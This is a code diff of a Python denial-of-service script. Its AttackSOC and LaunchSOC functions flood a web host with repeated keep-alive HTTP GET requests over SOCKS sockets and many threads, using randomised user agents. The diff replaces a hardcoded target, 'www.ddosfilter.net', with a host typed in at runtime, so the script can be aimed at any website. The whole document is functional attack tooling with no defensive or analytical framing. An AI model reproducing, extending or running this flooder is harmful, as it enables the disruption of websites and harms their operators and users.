@@ -4,14 +4,13 @@ import threading
 
 import socks
 
-server = 'www.ddosfilter.net'
 port = 80
 rs = 0
 closed = 0
 
 
 def LaunchSOC(th):
-    req = "GET " + '/' + " HTTP/1.1\r\nHost: " + 'www.ddosfilter.net' + "\r\n"
+    req = "GET " + '/' + " HTTP/1.1\r\nHost: " + host + "\r\n"
     req += "User-Agent: " + random.choice(ua) + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
@@ -29,7 +28,7 @@ def AttackSOC(req):
     global rs, closed, thd
     s = socks.socksocket()
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-    s.connect((str('www.ddosfilter.net'), int(80)))
+    s.connect((str(host), int(80)))
     while True:
         try:
             try:
@@ -44,6 +43,8 @@ def AttackSOC(req):
 
 
 if __name__ == '__main__':
+    host = input("HTTP Host: ")
+    #host = 'www.ddosfilter.net'
     th = int(input("Threads: "))
     ua = open('./ua.txt', 'r').read().split('\n')
     LaunchSOC(th)
